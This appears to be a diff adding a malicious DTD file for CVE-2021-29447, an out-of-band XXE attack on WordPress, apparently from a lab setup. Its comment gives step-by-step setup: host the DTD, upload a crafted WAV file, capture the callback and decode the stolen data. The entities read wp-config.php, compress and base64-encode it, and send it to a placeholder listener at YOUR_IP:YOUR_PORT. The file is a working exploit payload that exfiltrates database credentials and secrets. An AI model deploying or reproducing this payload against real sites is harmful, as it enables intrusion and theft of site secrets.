@@ -1,0 +1,23 @@
+<!--
+  Malicious DTD for CVE-2021-29447 OOB XXE exfiltration.
+
+  SETUP:
+    1. Replace YOUR_IP:PORT with your listener (e.g. 172.19.0.1:8888)
+       Find the correct gateway: docker network inspect <net> | grep Gateway
+    2. Host this file: python3 -m http.server 8888
+    3. Upload malicious.wav (created by 1_create_wav.py) to WordPress as j.doe
+    4. Watch your HTTP server for: GET /?p=<zlib+base64>
+    5. Decode:
+         import base64, zlib
+         data = base64.b64decode(CAPTURED + '==')
+         print(zlib.decompress(data, -15).decode())
+
+  NOTE: The zlib.deflate filter compresses wp-config.php before base64-encoding
+  so the URL stays within libxml2's ~4 KB request-line buffer limit.
+  Raw base64 of wp-config.php (~4400 chars) would exceed this limit.
+-->
+
+<!ENTITY % file   SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/wp-config.php">
+<!ENTITY % init   "<!ENTITY &#x25; send SYSTEM 'http://YOUR_IP:YOUR_PORT/?p=%file;'>">
+%init;
+%send;
